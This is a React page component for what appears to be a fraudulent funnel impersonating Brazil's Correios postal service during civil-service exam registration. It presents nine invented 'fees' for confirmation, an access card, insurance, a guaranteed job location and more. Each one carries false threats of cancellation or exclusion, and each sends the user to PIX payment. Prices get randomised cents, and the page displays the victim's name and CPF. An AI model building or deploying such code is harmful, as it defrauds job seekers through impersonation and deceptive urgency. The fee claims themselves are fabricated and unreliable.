import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELL_INFO = [
  {
    title: "Confirmação da Inscrição", valor: 47, icon: FileCheck,
    headline: "SUA INSCRIÇÃO PRECISA SER CONFIRMADA",
    explicacao: "Quando você fez sua inscrição, ela ficou com status PENDENTE no sistema. Isso significa que seu nome ainda NÃO aparece na lista oficial de candidatos. A confirmação é o que muda o status da sua inscrição de PENDENTE para CONFIRMADA. Sem isso, no dia da prova seu nome simplesmente não vai estar lá.",
    items: [
      "Mudança do status da inscrição de PENDENTE para CONFIRMADA",
      "Seu nome incluído na lista oficial de candidatos",
      "Número de protocolo definitivo gerado",
      "Comprovante de inscrição enviado por e-mail",
      "Reserva garantida da sua vaga no concurso",
      "Confirmação válida em todo o território nacional",
    ],
    consequencias: [
      "Sua inscrição será CANCELADA em 24 horas",
      "Você perderá a vaga e terá que refazer todo o processo",
      "O valor já pago NÃO será devolvido",
    ],
    nota: "Sem a confirmação, sua inscrição será CANCELADA automaticamente.",
  },
  {
    title: "Escolha do Local de Prova", valor: 37, icon: MapPin,
    headline: "ESCOLHA ONDE VOCÊ VAI FAZER A PROVA",
    explicacao: "Por padrão, o sistema distribui os candidatos nos locais de prova disponíveis de forma aleatória. Isso quer dizer que você pode ser mandado pra uma cidade que fica a horas de distância da sua casa. Pagando esta taxa, você escolhe o local mais perto de você e garante prioridade na alocação.",
    items: [
      "Prova no local mais próximo de você",
      "Sala com acessibilidade garantida",
      "Você recebe o endereço por e-mail e SMS",
      "Prioridade total na escolha do local",
      "Mapa com direções para o local da prova",
      "Opção de trocar o local até 48h antes da prova",
    ],
    consequencias: [
      "Você será alocado em qualquer local com vaga disponível",
      "Pode ter que viajar horas no dia da prova",
      "Não terá direito a solicitar mudança de local",
    ],
    nota: "Quem não paga essa taxa vai pra onde sobrar vaga.",
  },
  {
    title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
    headline: "VOCÊ PRECISA DO CARTÃO PRA ENTRAR NA PROVA",
    explicacao: "O Cartão de Acesso é o documento obrigatório que você apresenta na entrada do local de prova. Ele contém seu nome, foto, CPF, número de inscrição, sala e horário. Sem esse cartão, os fiscais NÃO vão deixar você entrar — mesmo que seu nome esteja na lista.",
    items: [
      "Documento oficial com seu nome, foto e CPF",
      "Número da sala e horário exato da prova",
      "QR Code para entrada rápida sem fila",
      "Versão digital disponível no celular",
      "Local da prova com endereço completo",
      "Código de barras para conferência dos fiscais",
      "Válido como documento de identificação no local",
    ],
    consequencias: [
      "Você será IMPEDIDO de entrar no local da prova",
      "Perderá a inscrição e todos os valores pagos",
      "Não haverá segunda chance — a prova acontece uma única vez",
    ],
    nota: "ATENÇÃO: Sem o Cartão de Acesso, você será IMPEDIDO de fazer a prova.",
  },
  {
    title: "Seguro do Candidato", valor: 27, icon: Shield,
    headline: "PROTEJA SEU DINHEIRO — SEGURO DO CANDIDATO",
    explicacao: "Concursos podem ser cancelados, adiados ou ter problemas no sistema a qualquer momento. Já aconteceu em concursos anteriores e milhares de candidatos perderam tudo que pagaram. Com o Seguro do Candidato, você tem reembolso garantido de 100% em qualquer situação imprevista.",
    items: [
      "Reembolso de 100% se o concurso for cancelado",
      "Cobertura total se a prova for adiada",
      "Proteção contra erro ou falha no sistema",
      "Suporte jurídico gratuito se precisar reclamar",
      "Cobertura para problemas no dia da prova (local fechado, etc.)",
      "Reembolso processado em até 7 dias úteis",
    ],
    consequencias: [
      "Se o concurso for cancelado, você PERDE todo o dinheiro investido",
      "Não terá direito a reembolso de nenhuma taxa paga",
      "Ficará sem suporte jurídico caso haja irregularidades",
    ],
    nota: "Sem o seguro, você perde tudo que pagou se o concurso for cancelado.",
  },
  {
    title: "Apostila Digital Oficial", valor: 33, icon: BookOpen,
    headline: "MATERIAL DE ESTUDO OFICIAL DO CONCURSO",
    explicacao: "Esta é a apostila elaborada com base no conteúdo programático oficial do edital. Contém todas as matérias que vão cair na prova, com questões comentadas de concursos anteriores da mesma banca. Candidatos que estudam com material oficial têm taxa de aprovação 3x maior.",
    items: [
      "Conteúdo completo de todas as matérias do edital",
      "Questões comentadas de provas anteriores da banca",
      "Resumos e mapas mentais para revisão rápida",
      "Acesso imediato após confirmação do pagamento",
      "Formato PDF — acesse no celular, tablet ou computador",
      "Atualizações automáticas se o edital mudar",
      "Gabaritos comentados com explicação passo a passo",
    ],
    consequencias: [
      "Você vai estudar sem saber o que realmente cai na prova",
      "Risco alto de reprovar por falta de preparação adequada",
      "Outros candidatos terão vantagem com o material oficial",
    ],
    nota: "Quem estuda com material oficial tem mais chance de passar.",
  },
  {
    title: "Simulado Online da Banca", valor: 24, icon: FileText,
    headline: "SIMULADO IDÊNTICO À PROVA REAL",
    explicacao: "Este simulado reproduz exatamente o formato, tempo e nível de dificuldade da prova real. Você vai fazer a prova nas mesmas condições do dia oficial — mesma quantidade de questões, mesmo tempo limite, mesmo estilo de pergunta. Quem faz simulado chega no dia da prova sem surpresa.",
    items: [
      "Mesmo tempo e formato da prova oficial",
      "Correção automática com gabarito comentado",
      "Ranking geral com outros candidatos",
      "Pode refazer quantas vezes quiser até o dia da prova",
      "Relatório de desempenho por matéria",
      "Identifica seus pontos fracos para focar no estudo",
      "Cronômetro integrado simulando a pressão real",
    ],
    consequencias: [
      "Você vai entrar na prova sem saber o formato das questões",
      "Não vai saber administrar o tempo durante a prova",
      "Risco de surpresa e nervosismo no dia",
    ],
    nota: "Você vai saber exatamente como vai ser no dia e não vai ter surpresa.",
  },
  {
    title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint,
    headline: "COMPROVE QUE VOCÊ ESTÁ APTO A FAZER A PROVA",
    explicacao: "O Certificado de Pré-Aprovação é o documento que comprova que você cumpriu todos os requisitos do edital e está apto a realizar a prova. Muitos candidatos usam este certificado para justificar falta no trabalho no dia da prova — empresas aceitam como comprovante oficial.",
    items: [
      "Certificado com seus dados completos e protocolo",
      "Aceito por empresas para justificar falta no trabalho",
      "Comprova que você é candidato oficial do concurso",
      "Válido como documento em todo o território nacional",
      "Pode ser apresentado em formato digital ou impresso",
      "Número de registro único para verificação online",
    ],
    consequencias: [
      "Não terá documento para justificar falta no trabalho",
      "Pode ter desconto no salário ou advertência por falta",
      "Não poderá comprovar que é candidato oficial se questionado",
    ],
    nota: "Use como comprovante pra pedir folga no dia da prova.",
  },
  {
    title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare,
    headline: "RECEBA TODOS OS AVISOS DO CONCURSO",
    explicacao: "Concursos mudam datas, locais e regras o tempo todo. Se você não ficar sabendo a tempo, pode perder um prazo importante ou ir pro local errado no dia da prova. Com o acompanhamento, você recebe tudo direto no celular — sem precisar ficar entrando em site.",
    items: [
      "Alerta imediato de mudança de data ou local",
      "Gabarito oficial enviado no dia da prova",
      "Resultado antes da publicação no site",
      "Avisos importantes por SMS direto no celular",
      "Lembretes automáticos antes da prova",
      "Notificação de convocação para posse",
      "Atualizações sobre recursos e mudanças no edital",
    ],
    consequencias: [
      "Pode perder prazos importantes sem saber",
      "Risco de ir pro local errado no dia da prova",
      "Vai descobrir o resultado depois de todo mundo",
    ],
    nota: "Quem não se cadastra, perde prazo e perde vaga.",
  },
  {
    title: "Garantia de Vaga na Região", valor: 97, icon: Star,
    headline: "ÚLTIMA ETAPA — GARANTA SUA VAGA",
    explicacao: "Esta é a última taxa do processo de inscrição. Com ela, você garante que se for aprovado, vai trabalhar na agência mais próxima da sua casa. Sem essa garantia, o órgão pode te enviar para qualquer cidade do estado — mesmo que fique a centenas de quilômetros de onde você mora.",
    items: [
      "Trabalhe na agência dos Correios mais perto de você",
      "Prioridade total na escolha da cidade de lotação",
      "Acompanhamento VIP de todo o processo até a posse",
      "Inscrição 100% concluída após este pagamento",
      "Suporte dedicado para dúvidas sobre o concurso",
      "Garantia registrada no sistema com número de protocolo",
      "Certificado de inscrição completa enviado por e-mail",
    ],
    consequencias: [
      "Pode ser enviado para QUALQUER cidade do estado",
      "Não terá prioridade na escolha do local de trabalho",
      "Sua inscrição ficará como INCOMPLETA no sistema",
    ],
    nota: "ATENÇÃO: Esta é a última taxa. Após o pagamento, sua inscrição estará 100% CONCLUÍDA.",
  },
];

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const info = UPSELL_INFO[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm(`/upsell/${stepNumber}`), { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">{info.headline}</h1>

          {/* Explicação detalhada */}
          <div className="rounded border border-border bg-muted/30 p-4 text-sm text-foreground leading-relaxed">
            {info.explicacao}
          </div>

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>O que está incluído nesta taxa</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td>✅ {item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Consequências */}
          <div className="rounded border-2 border-destructive bg-destructive/5 p-4 space-y-2">
            <p className="font-bold text-destructive text-sm">⚠ O que acontece se você NÃO pagar:</p>
            <ul className="space-y-1">
              {info.consequencias.map((c, i) => (
                <li key={i} className="text-sm text-destructive flex items-start gap-2">
                  <span className="mt-0.5">❌</span>
                  <span>{c}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Observação */}
          <div className="text-xs text-muted-foreground space-y-1">
            <p className="font-semibold text-destructive">⚠ IMPORTANTE:</p>
            <p>• {info.nota}</p>
            <p>• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
            <p className="text-sm font-semibold text-foreground">Valor da Taxa</p>
            <p className="text-3xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
            PAGAR TAXA AGORA
          </Button>

          <p className="text-[10px] text-center text-destructive font-semibold">
            O não pagamento desta taxa pode resultar no cancelamento da inscrição.
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
